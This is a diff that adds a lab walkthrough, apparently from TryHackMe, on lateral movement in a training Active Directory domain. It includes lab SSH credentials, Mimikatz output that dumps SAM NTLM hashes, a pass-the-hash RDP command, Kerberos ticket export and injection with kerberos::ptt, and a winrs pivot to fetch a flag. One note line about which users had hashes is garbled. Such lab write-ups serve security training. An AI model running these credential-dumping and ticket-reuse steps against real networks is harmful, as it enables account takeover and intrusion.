@@ -853,3 +853,213 @@ Technique	         Protocol	      Required Privilege	    Extracted Material	  Pu
 Pass‑the‑Ticket	   Kerberos	      SYSTEM (for LSASS dump)	TGT/TGS + Session Key	Reuse valid Kerberos tickets
 Pass‑the‑Key	     Kerberos	      SYSTEM (for LSASS dump)	AES/RC4 key	          Request new TGT without password
 Overpass‑the‑Hash	 Kerberos (RC4)	SYSTEM	                NTLM hash	            Use NTLM hash as Kerberos key
+
+
+### Final Task – Lateral Movement to THMIIS
+
+### 1. Connect to THMJMP2 (Jump Host)
+
+Use SSH with the provided domain credentials:
+```
+User: ZA.TRYHACKME.COM\t2_felicia.dean
+
+Password: iLov3THM!
+
+ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
+```
+This account has administrator privileges on THMJMP2, allowing full use of Mimikatz.
+
+
+#### 2. Extract Authentication Material with Mimikatz
+
+From THMJMP2, dump credentials from LSASS:
+
+- NTLM hashes → Pass‑the‑Hash
+- Kerberos tickets → Pass‑the‑Ticket
+- Kerberos keys (RC4/AES) → Pass‑the‑Key / Overpass‑the‑Hash
+
+Tools available at:
+```
+C:\tools\mimikatz.exe
+C:\tools\psexec64.exe
+```
+#### First LSASS NTLM Hashes
+```
+za\t2_felicia.dean@THMJMP2 c:\tools>mimikatz.exe                            
+                                                                            
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                 
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )    
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                     
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/   
+                                                                            
+mimikatz # privilege::debug                                                 
+Privilege '20' OK                                                           
+                                                                            
+mimikatz # token::elevate                                                   
+Token Id  : 0                                                               
+User name :                                                                 
+SID name  : NT AUTHORITY\SYSTEM                                             
+                                                                            
+504     {0;000003e7} 1 D 16809          NT AUTHORITY\SYSTEM     S-1-5-18    
+(04g,21p)       Primary                                                     
+ -> Impersonated !                                                          
+ * Process Token : {0;0020bc77} 0 D 2226945     ZA\t2_felicia.dean      S-1-
+5-21-3330634377-1326264276-632209373-4605       (12g,24p)       Primary     
+ * Thread Token  : {0;000003e7} 1 D 2283232     NT AUTHORITY\SYSTEM     S-1-
+5-18    (04g,21p)       Impersonation (Delegation)                          
+                                                                            
+mimikatz # lsadump::sam                                                     
+Domain : THMJMP2                                                            
+SysKey : 2e27b23479e1fb1161a839f9800119eb                                   
+Local SID : S-1-5-21-1946626518-647761240-1897539217                        
+                                                                            
+SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                   
+                                                                            
+RID  : 000001f4 (500)                                                       
+User : Administrator                                                        
+  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                               
+                                                                            
+RID  : 000001f5 (501)                                                       
+User : Guest                                                                
+                                                                            
+RID  : 000001f7 (503)                                                       
+User : DefaultAccount                                                       
+```
+The use one of the RDP options to use the has such as:
+```
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+```
+
+#### Next Kerberos tickets → Pass‑the‑Ticket
+
+Mimikatz exports every Kerberos ticket LSASS has seen:
+- TGTs (Ticket Granting Tickets)
+- TGSs (Service Tickets)
+- Tickets for SYSTEM
+- Tickets for services running under machine accounts
+- Tickets for other logged‑in users
+- Tickets for background processes
+- Tickets for scheduled tasks
+- Tickets for cached sessions
+
+This is why you see a huge list.
+
+But only ONE type matters for lateral movement:
+
+**You want the TGT for the user you are attacking**
+- In this room: t1_toby.beck
+- Appears t1_tony.beck hash. Many replica response and variations recorded here are the main two examples found, Tony no hash, but simon and felicia did.
+
+```
+mimikatz # privilege::debug                                                 
+Privilege '20' OK                                                           
+
+mimikatz # sekurlsa::tickets /export
+```
+Files exported are in directory unless otherwise stated from securlsa
+```
+mimikatz # exit                                                             
+Bye!     
+                                      
+za\t2_felicia.dean@THMJMP2 c:\tools>dir *.kirbi                                    
+...                           
+07/05/2026  03:46 PM             1,543 [0;1e393d]-2-0-40e10000-simon.evans@k
+rbtgt-ZA.TRYHACKME.COM.kirbi                                                
+07/05/2026  03:45 PM             1,583 [0;20bc77]-2-0-40e10000-t2_felicia.de
+an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
+...
+07/04/2026  02:46 AM             1,561 [0;21b11c]-2-0-40e10000-roger.baxter@
+krbtgt-ZA.TRYHACKME.COM.kirbi                                               
+...
+07/04/2026  02:33 AM             1,583 [0;32b139]-2-0-40e10000-t2_felicia.de
+an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
+...
+07/05/2026  03:46 PM             1,497 [0;3e4]-2-0-60a10000-THMJMP2$@krbtgt-
+ZA.TRYHACKME.COM.kirbi                                                      
+07/05/2026  03:46 PM             1,497 [0;3e4]-2-1-40e10000-THMJMP2$@krbtgt-
+ZA.TRYHACKME.COM.kirbi                                                      
+...
+07/05/2026  02:50 PM             1,497 [0;3e7]-2-0-40e10000-THMJMP2$@krbtgt-
+ZA.TRYHACKME.COM.kirbi                                                      
+07/05/2026  03:46 PM             1,497 [0;3e7]-2-0-60a10000-THMJMP2$@krbtgt-
+ZA.TRYHACKME.COM.kirbi                                                      
+07/05/2026  03:46 PM             1,497 [0;3e7]-2-1-40e10000-THMJMP2$@krbtgt-
+ZA.TRYHACKME.COM.kirbi                                                      
+07/04/2026  02:46 AM             1,583 [0;3ecc69]-2-0-40e10000-t2_felicia.de
+an@krbtgt-ZA.TRYHACKME.COM.kirbi                                            
+...
+07/05/2026  03:46 PM             1,705 [0;9811a]-0-0-40a50000-t1_toby.beck1@
+LDAP-THMDC.za.tryhackme.com.kirbi                                           
+07/05/2026  03:46 PM             1,555 [0;9811a]-2-0-40e10000-t1_toby.beck1@
+krbtgt-ZA.TRYHACKME.COM.kirbi                                               
+              38 File(s)      3,438,433 bytes                               
+               3 Dir(s)   6,207,197,184 bytes free     
+```
+Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command: For toby.beck1 at end there
+
+```
+mimikatz # kerberos::ptt "[0;9811a]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRY
+HACKME.COM.kirbi"                                                           
+                                                                            
+* File: '[0;9811a]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRYHACKME.COM.kirbi'
+: OK                                                                        
+                                                                            
+mimikatz # exit                                                             
+Bye!                                                                        
+                                                                            
+za\t2_felicia.dean@THMJMP2 c:\tools>klist                                   
+                                                                            
+Current LogonId is 0:0x5938b                                                
+                                                                            
+Cached Tickets: (1)                                                         
+                                                                            
+#0>     Client: t1_toby.beck1 @ ZA.TRYHACKME.COM                            
+        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                  
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
+ name_canonicalize                                                          
+        Start Time: 7/5/2026 15:43:45 (local)                               
+        End Time:   7/6/2026 1:43:45 (local)                                
+        Renew Time: 7/12/2026 15:43:45 (local)                              
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96                          
+        Cache Flags: 0x1 -> PRIMARY                                         
+        Kdc Called:                                                         
+                                                                            
+za\t2_felicia.dean@THMJMP2 c:\tools>     
+```
+#### Next Kerberos keys (RC4/AES) → Pass‑the‑Key / Overpass‑the‑Hash
+
+
+Your goal:
+- Extract authentication material for t1_toby.beck  
+- Inject it into your current session
+- Obtain a shell authenticated as t1_toby.beck
+
+Any of these techniques are acceptable:
+- Pass‑the‑Hash
+- Pass‑the‑Ticket
+- Pass‑the‑Key
+
+Once injected, your session silently uses t1_toby.beck’s credentials.
+
+
+#### 3. Pivot to THMIIS Using WinRS
+
+With t1_toby.beck’s credentials loaded, connect to THMIIS:
+
+Code
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+No username or password required — WinRS automatically uses the credentials injected into your current session.
+
+This gives you a remote command prompt on THMIIS as t1_toby.beck.
+
+
+#### 4. Retrieve the Flag
+
+Navigate to t1_toby.beck’s desktop on THMIIS and run:
+```
+flag.exe
+```
+The output is the answer to the challenge:
